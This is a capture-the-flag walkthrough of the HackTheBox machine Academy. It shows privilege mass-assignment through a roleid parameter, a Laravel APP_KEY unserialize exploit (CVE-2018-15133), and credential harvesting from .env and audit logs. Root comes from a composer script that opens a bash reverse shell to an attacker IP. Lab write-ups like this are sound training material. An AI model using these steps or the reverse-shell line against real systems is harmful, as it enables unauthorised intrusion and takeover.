---
title: HackTheBox - Academy Writeup
subtitle: Here's my writeup for the RETIRED machine Academy, Which is an easy Linux machine!
date: '2021-04-25'
draft: false
authors: ['elleuch']
categories: ['HackTheBox', 'Easy']
tags: ['HackThebox', 'easy']
image: /assets/img/htb-academy/featured.jpg
---


# Information Gathering

## Nmap scan 

```
sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215
```

![placeholder](/assets/img/htb-academy/nmap.png)

As we see we have 2 ports open <br/>
SSH on port 22 running OpenSSH 8.2p1 <br/>
http on port 80 running httpd 2.4.41 <br/>

we notice as well the academy.htb domain, which we should add to /etc/hosts.



## Gobuster scan 


```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php
```

![placeholder](/assets/img/htb-academy/gob.png)


# Initial Foothold


## Identifying the exploit

So basically the first thing that tried was sql injection on <b> admin.php </b> but that didn't give me any results. as we don't have any potential users let's move on and dig further. <br/>

Let's create an account and see if we can find any usernames and intercept it with burp

```
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o
Connection: close
uid=elleuch&password=elleuch&confirm=elleuch&roleid=0
```
We can notice the <b>roleid</b>	parameter which is set to 0. we can assume that's assigning a role to the user we're creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).

Let's change change 0 to 1 and forward the request and create our privileged user and try to login to <b>/admin.php</b> 

![placeholder](/assets/img/htb-academy/planner.png)

As we see above the planner leaks to us a subdomain <b>dev-staging-01.academy.htb</b> <br/>
Let's add it to /etc/hosts and see what we get

![placeholder](/assets/img/htb-academy/laravel.png)

Errors! That sounds promosing! Scrolling down we can see something really interesting
```
APP_KEY	 "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
```
We have the APP_KEY! We can abuse <b>Laravel Unserialize Vulnerability CVE-2018-15133 </b> <br/>
For this exploit we'll be using this script, a pretty easy syntax.
```
https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py
```

![placeholder](/assets/img/htb-academy/foothold.png)

And voilà we're on the box

# User Privesc

Now let's start enumarating,We already know that the webserver is running PHP Laravel. </br>
The first thing we should look at is the <b>.env</b> file. </br>

![placeholder](/assets/img/htb-academy/env.png)

And we get a password! <br />
`mySup3rP4s5w0rd!!` <br/>
Let's see if it belongs to any existing user

![placeholder](/assets/img/htb-academy/users.png)

After manually trying to switch to these users, it turns out to be cry0l1t3's password

![placeholder](/assets/img/htb-academy/logincry.png)

Our user is in the <b>adm</b> group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it

![placeholder](/assets/img/htb-academy/mrb3.png)

`data=6D7262336E5F41634064336D79210A`

Seems we got a password! But it's hex encoded! Let's decode it

![placeholder](/assets/img/htb-academy/pw.png)


`mrb3n_Ac@d3my!`

Seems like it's mrb3n's password! 

# Root Privesc

Mrb3n can execute <b>/usr/bin/composer</b> as root!

![placeholder](/assets/img/htb-academy/sudo.png)

Going through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!
```json
{ 
"scripts":{"shell":"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.111/4444 0>&1'"}
}
```

We set our listener 


```
nc -lvnp 4444 
```

And execute 

```
sudo /usr/bin/composer --working-dir=fake run-script shell
```

![placeholder](/assets/img/htb-academy/root.png)


And we rooted the box! <br/>
`uid=0(root) gid=0(root) groups=0(root)`


